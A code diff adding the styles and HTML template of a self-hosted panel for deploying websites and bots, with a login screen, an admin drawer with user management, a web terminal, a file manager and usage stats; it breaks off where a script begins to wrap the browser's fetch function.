+            background: rgba(0,229,255,0.2);
+            color: #00e5ff;
+        }
+        .btn-start-w:hover {
+            background: #00e5ff;
+            color: #000;
+        }
+        .btn-stop-w {
+            background: rgba(255,71,87,0.2);
+            color: #ff4757;
+        }
+        .btn-stop-w:hover {
+            background: #ff4757;
+            color: #fff;
+        }
+        .btn-restart-w {
+            background: rgba(255,170,0,0.2);
+            color: #ffaa00;
+        }
+        .btn-restart-w:hover {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-delete-w {
+            background: rgba(255,0,0,0.15);
+            color: #ff4444;
+        }
+        .btn-delete-w:hover {
+            background: #ff0000;
+            color: #fff;
+        }
+        .btn-edit-w {
+            background: rgba(77,136,255,0.2);
+            color: #4d88ff;
+        }
+        .btn-edit-w:hover {
+            background: #4d88ff;
+            color: #fff;
+        }
+        .btn-download-w {
+            background: rgba(46,204,113,0.2);
+            color: #2ecc71;
+        }
+        .btn-download-w:hover {
+            background: #2ecc71;
+            color: #fff;
+        }
+        .btn-files-w {
+            background: rgba(255,255,255,0.1);
+            color: #aaa;
+        }
+        .btn-files-w:hover {
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+        }
+        .btn-buildlogs-w {
+            background: rgba(255,165,0,0.2);
+            color: #ffa500;
+        }
+        .btn-buildlogs-w:hover {
+            background: #ffa500;
+            color: #000;
+        }
+        .name-edit {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .name-edit input {
+            flex: 1;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: #fff;
+            outline: none;
+            font-size: 0.85rem;
+        }
+        .name-edit input:focus {
+            border-color: #00e5ff;
+        }
+        .name-edit button {
+            padding: 8px 16px;
+            background: #00e5ff;
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* Console */
+        .console-wrapper {
+            display: flex;
+            align-items: stretch;
+            gap: 8px;
+            margin-top: 15px;
+        }
+        .console {
+            background: #000;
+            color: #00ff6a;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 10px;
+            border-radius: 8px;
+            height: 100px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            flex: 1;
+        }
+        .copy-console-btn {
+            background: transparent;
+            border: none;
+            color: #00e5ff;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0 8px;
+            display: flex;
+            align-items: center;
+            transition: transform 0.1s;
+        }
+        .copy-console-btn:hover {
+            transform: scale(1.1);
+        }
+
+        /* Footer */
+        .user-footer {
+            text-align: center;
+            margin-top: 30px;
+        }
+        .f-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 5px;
+        }
+        .f-sub {
+            font-size: 11px;
+            opacity: 0.6;
+            margin-bottom: 15px;
+        }
+        .social-box {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .social-box a {
+            color: #fff;
+            font-size: 20px;
+            width: 40px;
+            height: 40px;
+            border: 1px solid #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: border-color 0.2s;
+        }
+        .social-box a:hover {
+            border-color: #00e5ff;
+        }
+
+        /* ---------- ADMIN OVERLAY (DRAWER) ---------- */
+        .admin-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            justify-content: flex-end;
+            animation: fadeIn 0.25s ease;
+        }
+        .admin-overlay.open {
+            display: flex;
+        }
+
+        .admin-drawer {
+            width: 100%;
+            max-width: 480px;
+            height: 100%;
+            background: #0c1018;
+            padding: 24px 20px;
+            overflow-y: auto;
+            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.8);
+            animation: slideIn 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .admin-drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #222;
+        }
+        .admin-drawer-header h2 {
+            color: #00e5ff;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+        .admin-close-btn {
+            background: none;
+            border: none;
+            color: #ff4d4d;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 0 6px;
+        }
+
+        .admin-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .admin-tabs button {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background: transparent;
+            color: #aaa;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            min-width: 80px;
+        }
+        .admin-tabs button.active {
+            background: #00e5ff22;
+            border-color: #00e5ff;
+            color: #00e5ff;
+        }
+        .admin-tabs button:hover {
+            border-color: #555;
+        }
+
+        .admin-panel-content {
+            flex: 1;
+        }
+        .admin-tab-content {
+            display: none;
+        }
+        .admin-tab-content.active {
+            display: block;
+        }
+
+        /* ---------- ADMIN USER CARDS ---------- */
+        .list-item {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .list-item .row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+        }
+        .list-item .row .info {
+            flex: 1;
+            min-width: 120px;
+        }
+        .list-item .info .uname {
+            font-weight: 700;
+            font-size: 15px;
+            color: #fff;
+        }
+        .list-item .info .upass {
+            font-size: 13px;
+            color: #888;
+            font-family: monospace;
+        }
+        .badge-role {
+            font-size: 10px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+        .badge-role.admin {
+            background: #00e5ff33;
+            color: #00e5ff;
+            border: 1px solid #00e5ff55;
+        }
+        .badge-role.user {
+            background: #444;
+            color: #ccc;
+            border: 1px solid #555;
+        }
+        .badge-role.banned {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+
+        .limit-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .limit-group label {
+            color: #aaa;
+            font-size: 13px;
+            font-weight: bold;
+        }
+        .list-item .limit-input {
+            width: 70px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 6px;
+            border-radius: 5px;
+            font-size: 13px;
+            outline: none;
+            text-align: center;
+        }
+        .list-item .limit-input:focus {
+            border-color: #00e5ff;
+        }
+
+        .btn-action {
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            padding: 8px 14px;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+        .btn-set {
+            background: #00e5ff33;
+            color: #00e5ff;
+            border: 1px solid #00e5ff55;
+        }
+        .btn-set:hover {
+            background: #00e5ff55;
+        }
+        .btn-ban {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+        .btn-ban:hover {
+            background: #ff4d4d33;
+        }
+        .btn-reset {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        .btn-reset:hover {
+            background: #444;
+        }
+        .btn-del {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+        }
+        .btn-del:hover {
+            background: #ff4d4d33;
+        }
+        .btn-create {
+            background: #00e5ff;
+            color: #000;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .btn-create:hover {
+            opacity: 0.9;
+        }
+        .btn-remove {
+            background: transparent;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .btn-remove:hover {
+            background: #ff4d4d22;
+        }
+
+        /* Create user form */
+        #createUserForm {
+            display: none;
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a2a;
+        }
+        #createUserForm input,
+        #createUserForm select {
+            background: #0c1018;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            width: 100%;
+            margin-bottom: 10px;
+            outline: none;
+            font-size: 14px;
+        }
+        #createUserForm input:focus,
+        #createUserForm select:focus {
+            border-color: #00e5ff;
+        }
+        .create-row {
+            display: flex;
+            gap: 10px;
+        }
+        .create-row input {
+            flex: 1;
+        }
+
+        /* Simple list for User Menu tab */
+        .simple-list-item {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .simple-list-item .info {
+            display: flex;
+            flex-direction: column;
+        }
+        .simple-list-item .info .uname {
+            font-weight: 700;
+            font-size: 14px;
+            color: #fff;
+        }
+        .simple-list-item .info .upass {
+            font-size: 12px;
+            color: #888;
+            font-family: monospace;
+        }
+        .simple-list-item .actions button {
+            background: transparent;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .simple-list-item .actions button:hover {
+            background: #ff4d4d22;
+        }
+
+        .section-title {
+            color: #00e5ff;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 18px 0 10px 0;
+            border-bottom: 1px solid #222;
+            padding-bottom: 6px;
+        }
+
+        .empty-msg {
+            text-align: center;
+            color: #555;
+            padding: 20px 0;
+            font-size: 14px;
+        }
+
+        /* ---------- TERMINAL ---------- */
+        .terminal-box {
+            background: #010409;
+            color: #50fa7b;
+            height: 350px;
+            overflow-y: scroll;
+            padding: 12px;
+            border: 1px solid #30363d;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        .terminal-box .prompt {
+            color: #58a6ff;
+        }
+        .terminal-box .output {
+            color: #50fa7b;
+        }
+        .terminal-box .error {
+            color: #ff6b6b;
+        }
+        .terminal-controls {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .terminal-controls input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: white;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+            min-width: 150px;
+        }
+        .terminal-controls input:focus {
+            border-color: #00e5ff;
+        }
+        .terminal-controls button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-term-run {
+            background: #238636;
+            color: white;
+        }
+        .btn-term-run:hover {
+            background: #2ea043;
+        }
+        .btn-term-stop {
+            background: #da3633;
+            color: white;
+        }
+        .btn-term-stop:hover {
+            background: #f85149;
+        }
+        .btn-term-clear {
+            background: #555;
+            color: white;
+        }
+        .btn-term-clear:hover {
+            background: #666;
+        }
+
+        /* ---------- CUSTOM MODAL ---------- */
+        .custom-modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10001;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.2s ease;
+        }
+        .custom-modal-overlay.open {
+            display: flex;
+        }
+
+        .custom-modal {
+            background: #0c1018;
+            border: 1px solid #2a2a2a;
+            border-radius: 20px;
+            padding: 30px 28px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+            text-align: left;
+        }
+        .custom-modal .modal-icon {
+            font-size: 40px;
+            margin-bottom: 12px;
+            text-align: center;
+            color: #00e5ff;
+        }
+        .custom-modal .modal-body {
+            color: #eee;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .custom-modal .modal-body textarea {
+            width: 100%;
+            background: #050807;
+            color: #00ff88;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            resize: vertical;
+            tab-size: 4;
+            min-height: 200px;
+        }
+        .custom-modal .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            flex-wrap: wrap;
+        }
+        .custom-modal .modal-actions button {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            min-width: 100px;
+            transition: background 0.2s;
+        }
+        .custom-modal .modal-actions .btn-confirm {
+            background: #00e5ff;
+            color: #000;
+        }
+        .custom-modal .modal-actions .btn-confirm:hover {
+            background: #00d4f0;
+        }
+        .custom-modal .modal-actions .btn-cancel {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        .custom-modal .modal-actions .btn-cancel:hover {
+            background: #444;
+        }
+        .custom-modal .modal-actions .btn-ok {
+            background: #00e5ff;
+            color: #000;
+            width: 100%;
+        }
+        .custom-modal .modal-actions .btn-ok:hover {
+            background: #00d4f0;
+        }
+        .custom-modal .modal-body .btn-sm {
+            padding: 6px 14px;
+            font-size: 0.55rem;
+            border: 1px solid #33ddff;
+            color: #33ddff;
+            background: transparent;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        /* ---------- SETTINGS MODAL (from gear icon) ---------- */
+        #settingsModalOverlay {
+            z-index: 9999;
+        }
+
+        .settings-form label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-top: 15px;
+            margin-bottom: 4px;
+        }
+        .settings-form input[type="text"],
+        .settings-form input[type="file"] {
+            width: 100%;
+            background: #161b25;
+            border: 1px solid #2b3240;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            outline: none;
+            font-size: 14px;
+        }
+        .settings-form input:focus {
+            border-color: #00e5ff;
+        }
+        .settings-form .logo-preview {
+            margin-top: 10px;
+            max-width: 100px;
+            max-height: 100px;
+            border-radius: 50%;
+            border: 2px solid #00e5ff;
+        }
+        .settings-form .btn-remove-logo {
+            background: #ff3333;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .settings-form .btn-remove-logo:hover {
+            background: #cc0000;
+        }
+
+        /* ---------- FILE MANAGER ---------- */
+        .file-manager {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #0d1117;
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            border-bottom: 1px solid #1e1e1e;
+            cursor: pointer;
+            transition: background 0.2s;
+            user-select: none;
+        }
+        .file-item:hover {
+            background: #1a1f2b;
+        }
+        .file-item.selected {
+            background: #2a3a5a;
+            border-left: 3px solid #00e5ff;
+        }
+        .file-item .name {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ccc;
+        }
+        .file-item .name i {
+            width: 20px;
+            color: #00e5ff;
+        }
+        .file-item .name .dir-icon {
+            color: #f0c674;
+        }
+        .file-item .size {
+            font-size: 12px;
+            color: #888;
+        }
+        .file-breadcrumb {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-bottom: 10px;
+            padding: 8px;
+            background: #1a1f2b;
+            border-radius: 6px;
+        }
+        .file-breadcrumb span {
+            color: #00e5ff;
+            cursor: pointer;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        .file-breadcrumb span:hover {
+            background: #2a3a5a;
+        }
+        .file-breadcrumb .sep {
+            color: #555;
+            cursor: default;
+        }
+        .file-context-menu {
+            display: none;
+            position: fixed;
+            background: #1a1f2b;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 6px 0;
+            z-index: 10002;
+            min-width: 150px;
+        }
+        .file-context-menu .menu-item {
+            padding: 8px 16px;
+            color: #ccc;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .file-context-menu .menu-item:hover {
+            background: #2a3a5a;
+        }
+        .file-context-menu .menu-item.danger {
+            color: #ff4d4d;
+        }
+
+        /* Stats Modal */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-card .label {
+            color: #888;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-card .value {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #00e5ff;
+            margin: 5px 0;
+        }
+        .stat-card .sub {
+            color: #666;
+            font-size: 0.8rem;
+        }
+        .stat-card .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #1a1a1a;
+            border-radius: 4px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .stat-card .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg,#7a00ff,#00e5ff);
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        .offset-section {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 15px;
+            margin-top: 15px;
+        }
+        .offset-section label {
+            color: #aaa;
+        }
+        .offset-section .offset-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        .offset-section .offset-input input {
+            flex: 1;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            color: #fff;
+        }
+        .offset-section .offset-input button {
+            background: #00e5ff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            color: #000;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ---------- ANIMATIONS ---------- */
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(60px); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0c1018;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .admin-drawer { max-width: 100%; padding: 18px 14px; }
+            .list-item .row { flex-direction: column; align-items: stretch; }
+            .list-item .limit-input { width: 100%; }
+            .create-row { flex-direction: column; }
+            .limit-group { flex-wrap: wrap; }
+            .admin-tabs button { font-size: 11px; padding: 8px; }
+            .terminal-controls { flex-wrap: wrap; }
+            .terminal-controls input { width: 100%; }
+            .bot-controls { grid-template-columns: 1fr 1fr; }
+            .file-item { flex-wrap: wrap; }
+            .stats-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================ -->
+    <!--  VIEW: LOGIN                                                   -->
+    <!-- ============================================================ -->
+    <div id="loginView" class="view {% if not logged_in %}active{% endif %}">
+        <div class="login-card">
+            <div class="login-content">
+                <div class="login-icon" id="loginIcon">
+                    {% if logo_url %}
+                        <img src="{{ logo_url }}" alt="Logo" />
+                    {% else %}
+                        <i class="fa-solid fa-user"></i>
+                    {% endif %}
+                </div>
+                <h1 class="login-title">{{ website_name }}</h1>
+                <select id="loginRoleSelect">
+                    <option value="user" selected>USER ACCESS</option>
+                    <option value="admin">Admin</option>
+                </select>
+                <input type="text" id="loginUsername" placeholder="Enter Username" />
+                <input type="password" id="loginPassword" placeholder="Password" />
+                <button class="login-btn" id="loginBtn">ACCESS SYSTEM</button>
+                <div class="login-error" id="loginError"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  VIEW: USER DASHBOARD                                          -->
+    <!-- ============================================================ -->
+    <div id="userView" class="view {% if logged_in %}active{% endif %}">
+        <div class="user-container">
+
+            <!-- Header -->
+            <div class="user-header">
+                <div class="user-header-left">
+                    <span class="hamburger" id="hamburgerBtn">☰</span>
+                    <span class="user-title">{{ website_name }}</span>
+                </div>
+                <div class="power-btn" id="logoutBtn"><i class="fa-solid fa-power-off"></i></div>
+            </div>
+
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab-btn active" data-tab="websites">🌐 Websites</button>
+                <button class="tab-btn" data-tab="bots">🤖 Bots</button>
+            </div>
+
+            <!-- Websites Tab -->
+            <div id="tab-websites" class="tab-content active">
+                <div class="upload-card" id="uploadCardWebsite">
+                    <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
+                    <div id="uploadLabelWebsite">UPLOAD WEBSITE (ZIP or files)</div>
+                    <div class="deploy-btn" id="deployBtnWebsite">DEPLOY WEBSITE</div>
+                    <input type="file" id="fileInputWebsite" style="display:none;" multiple accept=".zip,.py,.js,.html,.css,.json,.txt,.php,.go,.rb,.sh,.pl,.jar,.war,.xml,.gradle" />
+                    <div id="fileCountDisplayWebsite"></div>
+                </div>
+                <div id="websiteGrid" class="website-grid"></div>
+                <div class="console-wrapper" style="margin-top:10px;">
+                    <div class="console" id="websiteConsole">Select a website to see logs.</div>
+                </div>
+            </div>
+
+            <!-- Bots Tab -->
+            <div id="tab-bots" class="tab-content">
+                <div class="upload-card" id="uploadCardBot">
+                    <div class="cloud-icon"><i class="fa-solid fa-robot"></i></div>
+                    <div id="uploadLabelBot">UPLOAD BOT (ZIP or files)</div>
+                    <div class="deploy-btn" id="deployBtnBot">DEPLOY BOT</div>
+                    <input type="file" id="fileInputBot" style="display:none;" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl,.json,.txt" />
+                    <div id="fileCountDisplayBot"></div>
+                </div>
+                <div id="botListContainer"></div>
+                <div class="console-wrapper">
+                    <div class="console" id="botConsole">Select a bot to see logs.</div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="user-footer">
+                <div class="f-title">{{ website_name }}</div>
+                <div class="f-sub">LOVE YOU ALL. SUPPORT KARO</div>
+                <div class="social-box">
+                    <a href="{{ social_links.telegram }}" target="_blank"><i class="fa-brands fa-telegram"></i></a>
+                    <a href="{{ social_links.youtube }}" target="_blank"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="{{ social_links.instagram }}" target="_blank"><i class="fa-brands fa-instagram"></i></a>
+                    <a href="{{ social_links.tiktok }}" target="_blank"><i class="fa-brands fa-tiktok"></i></a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  ADMIN OVERLAY (DRAWER)                                        -->
+    <!-- ============================================================ -->
+    <div class="admin-overlay" id="adminOverlay">
+        <div class="admin-drawer">
+
+            <div class="admin-drawer-header">
+                <h2><i class="fa-solid fa-shield-halved" style="margin-right:8px;"></i>ADMIN PANEL</h2>
+                <button class="admin-close-btn" id="adminCloseBtn">✕</button>
+            </div>
+
+            <div class="admin-tabs">
+                <button class="active" data-tab="tabAdminMenu">🛠️ ADMIN MENU</button>
+                <button data-tab="tabUserMenu">👥 USER MENU</button>
+                <button data-tab="tabTerminal">💻 TERMINAL</button>
+                <button data-tab="tabFileManager">📁 FILES</button>
+                {% if is_admin %}
+                <button data-tab="tabStats">📊 STATS</button>
+                {% endif %}
+            </div>
+
+            <div class="admin-panel-content">
+                <!-- ADMIN MENU -->
+                <div id="tabAdminMenu" class="admin-tab-content active">
+                    <button class="btn-create" id="toggleCreateUserBtn" style="width:100%;margin-bottom:12px;">
+                        <i class="fa-solid fa-plus"></i> NEW USER
+                    </button>
+                    <button class="btn-create" id="editProfileBtn" style="width:100%;margin-bottom:12px;background:#4d88ff;">
+                        <i class="fa-solid fa-user-edit"></i> EDIT PROFILE
+                    </button>
+                    <div id="createUserForm">
+                        <input type="text" id="newUsername" placeholder="Username" />
+                        <input type="password" id="newPassword" placeholder="Password" />
+                        <input type="text" id="newExpiry" placeholder="Expiry (Days, e.g. 1, 5, 30)" />
+                        <select id="newRole">
+                            <option value="user">User</option>
+                            <option value="admin">Admin</option>
+                        </select>
+                        <button class="btn-create" id="createUserBtn" style="width:100%;">CREATE</button>
+                    </div>
+                    <div id="fullUserListContainer"></div>
+                </div>
+
+                <!-- USER MENU -->
+                <div id="tabUserMenu" class="admin-tab-content">
+                    <div class="section-title">👑 Admin List</div>
+                    <div id="simpleAdminListContainer"></div>
+                    <div class="section-title" style="margin-top:24px;">👤 User List</div>
+                    <div id="simpleUserListContainer"></div>
+                </div>
+
+                <!-- TERMINAL -->
+                <div id="tabTerminal" class="admin-tab-content">
+                    <div class="terminal-box" id="terminalOutput">
+                        <span class="prompt">$ </span>Connected...<br />
+                    </div>
+                    <div class="terminal-controls">
+                        <input type="text" id="terminalCommand" placeholder="Type command or input..." />
+                        <button class="btn-term-run" id="termRunBtn"><i class="fa-solid fa-play"></i> Run</button>
+                        <button class="btn-term-stop" id="termStopBtn"><i class="fa-solid fa-stop"></i> Stop</button>
+                        <button class="btn-term-clear" id="termClearBtn"><i class="fa-solid fa-eraser"></i> Clear</button>
+                    </div>
+                </div>
+
+                <!-- FILE MANAGER -->
+                <div id="tabFileManager" class="admin-tab-content">
+                    <div class="file-breadcrumb" id="fileBreadcrumb"></div>
+                    <div class="file-manager" id="fileManagerList"></div>
+                    <div style="margin-top:10px;font-size:12px;color:#555;">Long press on item (or right-click) for actions</div>
+                </div>
+
+                <!-- STATS -->
+                {% if is_admin %}
+                <div id="tabStats" class="admin-tab-content">
+                    <div class="stats-grid" id="statsGrid">
+                        <div class="stat-card"><div class="label">Total Hours Used</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
+                        <div class="stat-card"><div class="label">Main Container Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
+                        <div class="stat-card"><div class="label">Internal Sites/Bots</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
+                        <div class="stat-card"><div class="label">Render External Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
+                        <div class="stat-card"><div class="label">Storage (Uploads)</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
+                        <div class="stat-card"><div class="label">Container RAM</div><div class="value" id="statRam">--</div><div class="sub"><span id="statRamUsed">--</span> MB / <span id="statRamTotal">--</span> MB</div><div class="progress-bar"><div class="fill" id="ramFill" style="width:0%;"></div></div></div>
+                        <div class="stat-card"><div class="label">CPU Usage</div><div class="value" id="statCpu">--</div><div class="sub">Percent</div></div>
+                    </div>
+                    <div class="offset-section">
+                        <label>🔧 Set Offset (Total Hours from Render Dashboard)</label>
+                        <div class="offset-input">
+                            <input type="number" id="offsetInput" step="0.01" placeholder="e.g. 52.30" />
+                            <button id="setOffsetBtn">SET OFFSET</button>
+                        </div>
+                        <div style="font-size:0.75rem;color:#666;margin-top:5px;">Render Dashboard → Usage → Total Hours Used so far.</div>
+                    </div>
+                </div>
+                {% endif %}
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  CUSTOM MODAL                                                 -->
+    <!-- ============================================================ -->
+    <div class="custom-modal-overlay" id="customModalOverlay">
+        <div class="custom-modal">
+            <div class="modal-icon" id="modalIcon">⚠️</div>
+            <div class="modal-body" id="modalBody"></div>
+            <div class="modal-actions" id="modalActions"></div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  SETTINGS MODAL (gear icon)                                   -->
+    <!-- ============================================================ -->
+    <div class="custom-modal-overlay" id="settingsModalOverlay">
+        <div class="custom-modal">
+            <div class="modal-icon" style="text-align:center;color:#00e5ff;"><i class="fa-solid fa-gear"></i></div>
+            <div class="modal-body" id="settingsModalBody">
+                <div class="settings-form">
+                    <label>Website Name</label>
+                    <input type="text" id="settingsWebsiteName" placeholder="Website name" />
+                    
+                    <label>Telegram Link</label>
+                    <input type="text" id="settingsTelegram" placeholder="https://t.me/..." />
+                    
+                    <label>YouTube Link</label>
+                    <input type="text" id="settingsYoutube" placeholder="https://youtube.com/..." />
+                    
+                    <label>Instagram Link</label>
+                    <input type="text" id="settingsInstagram" placeholder="https://instagram.com/..." />
+                    
+                    <label>TikTok Link</label>
+                    <input type="text" id="settingsTiktok" placeholder="https://tiktok.com/..." />
+                    
+                    <label>Upload Logo (PNG, JPG, GIF, WEBP)</label>
+                    <input type="file" id="settingsLogoInput" accept="image/*" />
+                    <div id="settingsLogoPreview"></div>
+                    <button class="btn-remove-logo" id="settingsRemoveLogoBtn">Remove Logo</button>
+                </div>
+            </div>
+            <div class="modal-actions">
+                <button class="btn-cancel" id="settingsCancelBtn">Cancel</button>
+                <button class="btn-confirm" id="settingsSaveBtn">Save Settings</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  CONTEXT MENU (file manager)                                  -->
+    <!-- ============================================================ -->
+    <div class="file-context-menu" id="fileContextMenu">
+        <div class="menu-item" id="ctxDelete"><i class="fa-solid fa-trash"></i> Delete</div>
+        <div class="menu-item" id="ctxRename"><i class="fa-solid fa-pen"></i> Rename</div>
+        <div class="menu-item" id="ctxDownload"><i class="fa-solid fa-download"></i> Download</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!--  JAVASCRIPT                                                   -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ---------- GLOBAL FETCH INTERCEPTOR ----------
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
